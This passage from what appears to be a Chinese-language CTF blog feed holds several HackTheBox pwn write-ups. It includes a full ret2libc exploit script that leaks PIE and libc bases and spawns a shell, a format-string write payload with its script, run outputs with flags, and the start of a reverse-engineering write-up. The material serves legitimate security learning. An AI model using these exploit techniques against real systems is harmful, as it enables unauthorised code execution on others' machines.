data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">└─$ python vault2.py</span><br><span class="line">[+] Opening connection to 94.237.52.225 on port 39459: Done</span><br><span class="line">i=31</span><br><span class="line">i=30</span><br><span class="line">i=29</span><br><span class="line">i=28</span><br><span class="line">i=27</span><br><span class="line">i=26</span><br><span class="line">i=25</span><br><span class="line">i=24</span><br><span class="line">i=23</span><br><span class="line">i=22</span><br><span class="line">i=21</span><br><span class="line">i=20</span><br><span class="line">i=19</span><br><span class="line">i=18</span><br><span class="line">i=17</span><br><span class="line">i=16</span><br><span class="line">i=15</span><br><span class="line">i=14</span><br><span class="line">i=13</span><br><span class="line">i=12</span><br><span class="line">i=11</span><br><span class="line">i=10</span><br><span class="line">i=9</span><br><span class="line">i=8</span><br><span class="line">i=7</span><br><span class="line">i=6</span><br><span class="line">i=5</span><br><span class="line">i=4</span><br><span class="line">i=3</span><br><span class="line">i=2</span><br><span class="line">i=1</span><br><span class="line">i=0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">HTB&#123;d4nz4_kudur0r0r0&#125;</span><br></pre></td></tr></table></figure></div></li></ol><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned"></a>Pwned</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/vault_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;這題保護全開，然後程式主邏輯如下：&lt;/p&gt;
&lt;div cla</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Space pirate: Retribution Writeup</title>
    <link href="https://kazma.tw/2024/11/06/HackTheBox-Challenges-Space-pirate-Retribution-Writeup/"/>
    <id>https://kazma.tw/2024/11/06/HackTheBox-Challenges-Space-pirate-Retribution-Writeup/</id>
    <published>2024-11-06T06:04:48.148Z</published>
    <updated>2024-11-06T07:11:15.380Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>直接來看這題的主邏輯和保護機制：<br>PIE 有開，有 canary，所以要 leak stack variable 然後 ret2libc </p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─$ checksec ./sp_retribution</span><br><span class="line">[*] <span class="string">&#x27;/home/kazma/challenge3/sp_retribution&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RUNPATH:  b<span class="string">&#x27;./glibc/&#x27;</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">missile_launcher</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1[<span class="number">4</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0x53E5854620FB399F</span>LL;</span><br><span class="line">  v3 = <span class="number">0x576B96B95DF201F9</span>LL;</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n[*] Current target&#x27;s coordinates: x = [0x%lx], y = [0x%lx]\n\n[*] Insert new coordinates: x = [0x%lx], y = &quot;</span>,</span><br><span class="line">    <span class="number">0x53E5854620FB399F</span>LL,</span><br><span class="line">    <span class="number">0x576B96B95DF201F9</span>LL,</span><br><span class="line">    <span class="number">0x53E5854620FB399F</span>LL);</span><br><span class="line">  <span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="keyword">sizeof</span>(v1));</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x1F</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n[*] New coordinates: x = [0x53e5854620fb399f], y = %s\n[*] Verify new coordinates? (y/n): &quot;</span>, buf);</span><br><span class="line">  read(<span class="number">0</span>, v1, <span class="number">0x84</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(</span><br><span class="line">           <span class="string">&quot;\n%s[-] Permission Denied! You need flag.txt in order to proceed. Coordinates have been reset!%s\n&quot;</span>,</span><br><span class="line">           <span class="string">&quot;\x1B[1;31m&quot;</span>,</span><br><span class="line">           <span class="string">&quot;\x1B[1;34m&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>可以看到有兩個明顯的漏洞。<br>首先是 buf 沒有被初始化，然後又被印出來，所以我們可以嘗試透過覆蓋不同長度的 offset 來找到可以用的 stack address 甚至是 libc address，這部分很多網路上的 writeup 都講錯，漏洞主因是沒有初始化才對。<br>然後第二個 read 是 bof 應該沒什麼問題，所以我們的目標就是 leak stack address，然後算出 pie base，接著利用 pie base call puts leak got 找 libc base，最後 bof system(‘&#x2F;bin&#x2F;sh’)。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;sp_retribution&quot;</span>)</span><br><span class="line">l = ELF(<span class="string">&quot;./glibc/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&quot;./sp_retribution&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;94.237.59.180&quot;</span>, <span class="number">45699</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: Find PIE Base</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;[*] Insert new coordinates: x = [0x53e5854620fb399f], y = &quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">7</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;aaaaaaa\n&quot;</span>)</span><br><span class="line">leak = u64(r.recvline().strip().ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;Leaked PIE --&gt; %#0x&quot;</span>, leak)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">base = leak - <span class="number">3440</span></span><br><span class="line">success(<span class="string">&quot;Find PIE Base --&gt; %#0x&quot;</span>, base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Find Libc Base</span></span><br><span class="line">rop = ROP(elf)</span><br><span class="line">p = flat(</span><br><span class="line">    <span class="string">b&quot;a&quot;</span> * <span class="number">0x58</span>,</span><br><span class="line">    base + rop.rdi[<span class="number">0</span>],</span><br><span class="line">    base + elf.got.puts,</span><br><span class="line">    base + elf.plt.puts,</span><br><span class="line">    base + elf.sym.missile_launcher,</span><br><span class="line">)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;(y/n): &quot;</span>, p)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;reset!&quot;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">puts_got = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line">l.address = puts_got - l.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;Find libc base --&gt; %#0x&quot;</span>, l.address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">system = l.sym.system</span><br><span class="line">bin_sh = <span class="built_in">next</span>(l.search(<span class="string">&quot;/bin/sh\0&quot;</span>))</span><br><span class="line">p2 = flat(<span class="string">b&quot;a&quot;</span> * <span class="number">0x58</span>, base + rop.rdi[<span class="number">0</span>], bin_sh, system)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;new coordinates: x = [0x53e5854620fb399f], y = &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;(y/n): &quot;</span>, p2)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;reset!&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;cat flag.txt&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>執行結果：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[*] <span class="string">&#x27;/home/kazma/challenge3/sp_retribution&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RUNPATH:  b<span class="string">&#x27;./glibc/&#x27;</span></span><br><span class="line">[*] <span class="string">&#x27;/home/kazma/challenge3/glibc/libc.so.6&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to 94.237.59.180 on port 45699: Don[[+] Opening connection to 94.237.59.180 on port 45699: Done[+] Leaked PIE --&gt; 0x5626f6c00d70</span><br><span class="line">[+] Find PIE Base --&gt; 0x5626f6c00000</span><br><span class="line">[*] Loaded 14 cached gadgets <span class="keyword">for</span> <span class="string">&#x27;sp_retribution&#x27;</span></span><br><span class="line">[+] Find libc base --&gt; 0x7f82e0a13000</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">HTB&#123;w3_f1n4lly_m4d3_1t&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned"></a>Pwned</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/pwn_retribution.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;直接來看這題的主邏輯和保護機制：&lt;br&gt;PIE 有開，有 c</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="retlibc" scheme="https://kazma.tw/tags/retlibc/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Space pirate: Entrypoint Writeup</title>
    <link href="https://kazma.tw/2024/11/05/HackTheBox-Challenges-Space-pirate-Entrypoint-Writeup/"/>
    <id>https://kazma.tw/2024/11/05/HackTheBox-Challenges-Space-pirate-Entrypoint-Writeup/</id>
    <published>2024-11-05T08:25:54.324Z</published>
    <updated>2024-11-05T08:53:12.998Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>直接放上題目關鍵邏輯的反編譯：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 num; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+0h] [rbp-40h] OVERLAPPED BYREF</span></span><br><span class="line">  <span class="type">int</span> *v6; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setup(argc, argv, envp);</span><br><span class="line">  banner();</span><br><span class="line">  *(_QWORD *)&amp;v5 = <span class="number">0xDEADBEEF</span>LL;</span><br><span class="line">  v6 = &amp;v5;</span><br><span class="line">  <span class="built_in">printf</span>(a1ScanCard);</span><br><span class="line">  num = read_num();</span><br><span class="line">  <span class="keyword">if</span> ( num != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( num == <span class="number">2</span> )</span><br><span class="line">      check_pass();</span><br><span class="line">    <span class="built_in">printf</span>(aSInvalidOption, <span class="string">&quot;\x1B[1;5;31m&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">6969</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n[!] Scanning card.. Something is wrong!\n\nInsert card&#x27;s serial number: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x1F</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nYour card is: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)&amp;v5 == <span class="number">0xDEAD1337</span>LL )</span><br><span class="line">    open_door();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(aSInvalidIdIntr, <span class="string">&quot;\x1B[1;5;31m&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>上面我有先調整過一些部分，例如 v6 應該是 v5 的 pointer 才對。<br>然後 <code>check_pass()</code> 不是今天要討論的重點，漏洞部分在 <code>printf(buf);</code> 有 format string 可以利用，然後題目保護全開，所以我們目標是通過後面開 flag 的檢查，也就是 v5 要等於 0xdead1337，但是一開始 v5 被宣告成 0xdeadbeef，所以我們要透過 format string write 來修改後面兩個 bytes 為 0x1337。<br>具體 payload 我們可以用：<code>%4919c%7$hn&quot;</code>，各部分的解釋如下：</p><ul><li>%4919c%: 因為 printf 的 %n 寫入的是長度，所以如果打 0x1337 個字符會很沒有效率，這邊用 %?c 來直接決定輸入的長度也就是實際寫入得值，0x1337 的十進位是 4919。</li><li>然後 %7 是要寫入的位置距離現在的 offset，這個待會算給各位看</li><li>最後 %hn 代表的是寫入 2 個 bytes<br>寫入位置的算法可以直接用 printf format string 的特性來看位置:<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. Scan card 💳</span><br><span class="line">2. Insert password ↪️</span><br><span class="line">&gt; 1</span><br><span class="line"></span><br><span class="line">[!] Scanning card.. Something is wrong!</span><br><span class="line"></span><br><span class="line">Insert card<span class="string">&#x27;s serial number: %p %p %p %p %p %p %p %p %p</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your card is: 0x7ffe036aed40 0x7f411a7ed8c0 (nil) 0xf (nil) 0xdeadbeef 0x7ffe036b13e0 0x7025207025207025 0x2520702520702520</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">U</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[-] Invalid ID! Intruder detected! 🚨 🚨</span></span><br></pre></td></tr></table></figure></div>所以 v5 的 offset 是 6，v6 的 offset 就在 7，然後我們要做的是寫入到 pointer，也就是前面說的 offset 7。</li></ul><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./sp_entrypoint&quot;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;94.237.51.112&quot;</span>, <span class="number">52633</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p = <span class="string">b&quot;%4919c%7$hn&quot;</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;: &quot;</span>, p)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Door opened, you can proceed with the passphrase: &quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>執行結果：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./sp_entrypoint&#x27;</span>: pid 376139</span><br><span class="line">[+] Opening connection to 94.237.51.112 on port 52633: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">HTB&#123;g4t3_0n3_d4rkn3e55_th3_w0rld_0f_p1r4t35&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/pirate_entry_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;直接放上題目關鍵邏輯的反編譯：&lt;/p&gt;
&lt;div class</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="fmt-write" scheme="https://kazma.tw/tags/fmt-write/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges WIDE Writeup</title>
    <link href="https://kazma.tw/2024/11/04/HackTheBox-Challenges-WIDE-Writeup/"/>
    <id>https://kazma.tw/2024/11/04/HackTheBox-Challenges-WIDE-Writeup/</id>
    <published>2024-11-04T08:38:57.319Z</published>
    <updated>2024-11-04T08:47:41.812Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>這題用 ida 開起來後就會看到 usage 是要帶上他附給我們的 db 當作參數傳進去 ELF，接著如下：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./wide db.ex</span><br><span class="line">[*] Welcome user: kr4eq4L2<span class="variable">$12xb</span>, to the Widely Inflated Dimension Editor [*]</span><br><span class="line">[*]    Serving your pocket dimension storage needs since 14,012.5 B      [*]</span><br><span class="line">[*]                       Displaying Dimensions....                      [*]</span><br><span class="line">[*]       Name       |              Code                |   Encrypted    [*]</span><br><span class="line">[X] Primus           | people breathe variety practice  |                [*]</span><br><span class="line">[X] Cheagaz          | scene control river importance   |                [*]</span><br><span class="line">[X] Byenoovia        | fighting cast it parallel        |                [*]</span><br><span class="line">[X] Cloteprea        | facing motor unusual heavy       |                [*]</span><br><span class="line">[X] Maraqa           | stomach motion sale valuable     |                [*]</span><br><span class="line">[X] Aidor            | feathers stream sides gate       |                [*]</span><br><span class="line">[X] Flaggle Alpha    | admin secret power hidden        |       *        [*]</span><br><span class="line">Which dimension would you like to examine? 1</span><br><span class="line">The Ice Dimension</span><br><span class="line">Which dimension would you like to examine? 2</span><br><span class="line">The Berserk Dimension</span><br><span class="line">Which dimension would you like to examine? 3</span><br><span class="line">The Hungry Dimension</span><br><span class="line">Which dimension would you like to examine? 4</span><br><span class="line">The Water Dimension</span><br><span class="line">Which dimension would you like to examine? 5</span><br><span class="line">The Bone Dimension</span><br><span class="line">Which dimension would you like to examine? 6</span><br><span class="line">[X] That entry is encrypted - please enter your WIDE decryption key: sup3rs3cr3tw1d3</span><br><span class="line">HTB&#123;som3_str1ng5_4r3_w1d3&#125;</span><br><span class="line">Which dimension would you like to examine? Our home dimension</span><br><span class="line">Which dimension would you like to examine?</span><br></pre></td></tr></table></figure></div><p>他會問我們要檢查哪個 dimension，然後就會發現 6 是需要密碼的，我們可以開 ida 後在 <code>menu()</code> 裡面看到我們要比對的密碼，看到 rodata 的地方可以看到密碼：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">rodata:<span class="number">00000000000010</span>D0 ; <span class="type">const</span> <span class="type">char</span> aXThatEntryIsEn[]</span><br><span class="line">.rodata:<span class="number">00000000000010</span>D0 aXThatEntryIsEn db <span class="string">&#x27;[X] That entry is encrypted - please enter your WIDE decryption k&#x27;</span></span><br><span class="line">.rodata:<span class="number">00000000000010</span>D0                                         ; DATA XREF: menu+<span class="number">2B</span>9↑o</span><br><span class="line">.rodata:<span class="number">0000000000001111</span>                 db <span class="string">&#x27;ey: &#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">0000000000001116</span>                 align <span class="number">8</span></span><br><span class="line">.rodata:<span class="number">0000000000001118</span> ; <span class="type">const</span> <span class="type">wchar_t</span> s2</span><br><span class="line">.rodata:<span class="number">0000000000001118</span> s2              db <span class="string">&#x27;s&#x27;</span>,<span class="number">0</span>                ; DATA XREF: menu+<span class="number">30</span>A↑o</span><br><span class="line">.rodata:<span class="number">000000000000111</span>A                 align <span class="number">4</span></span><br><span class="line">.rodata:<span class="number">000000000000111</span>C aU              db <span 